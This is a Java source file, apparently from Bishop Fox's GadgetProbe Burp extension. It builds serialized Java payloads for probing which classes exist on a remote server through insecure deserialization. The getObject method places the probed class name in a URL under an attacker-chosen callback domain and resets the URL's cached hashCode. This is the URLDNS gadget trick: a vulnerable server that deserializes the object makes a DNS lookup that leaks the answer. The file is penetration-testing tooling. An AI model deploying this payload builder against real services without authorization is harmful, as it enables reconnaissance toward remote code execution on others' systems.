package com.bishopfox.gadgetprobe;

import burp.Analyzer;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;

import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.net.*;
import java.util.*;

import static com.nqzero.permit.Permit.setAccessible;

public class GadgetProbe {

    private String callbackDomain;
    private ClassPool pool;

    public GadgetProbe(String callback_domain) {
        this.callbackDomain = callback_domain;
        this.pool = new ClassPool(true);
    }

    private class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }

    private Class getOrGenerateClass(String className) {
        Class clazz = null;
        try {
            clazz = Class.forName(className);
        } catch (ClassNotFoundException e) {
            CtClass cc = pool.makeClass(className);

            try {
                clazz = cc.toClass();
                return clazz;
            } catch (CannotCompileException err) {
                if (err.getCause() != null && err.getCause().getCause() instanceof SecurityException) {
                    System.err.println("Error: Classname is in protected package. Most likely a typo: " + className);
                } else {
                    err.printStackTrace();
                }
            }
        }
        return clazz;
    }

    @SuppressWarnings("unchecked")
    public Object getObject(final String clsname) {
        URLStreamHandler handler = new SilentURLStreamHandler();

        LinkedHashMap hm = new LinkedHashMap();
        URL u = null;

        try {
            u = new URL(null, "http://" + clsname.replaceAll("_","d-4-sh").replaceAll("\\$","d-0-ll") + "." + callbackDomain, handler);
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
        Class clazz = getOrGenerateClass(clsname);
        if (clazz == null) {
            return null;
        }
        hm.put("test", clazz);
        hm.put(u, "test");
        try {
            Field field = URL.class.getDeclaredField("hashCode");
            setAccessible(field);

            field.set(u, -1);
        } catch (NoSuchFieldException | IllegalAccessException e) {
            e.printStackTrace();
        }
        return hm;
    }
    public static void main(String[] args) {
        System.out.println(Analyzer.getWordlist());
    }
}
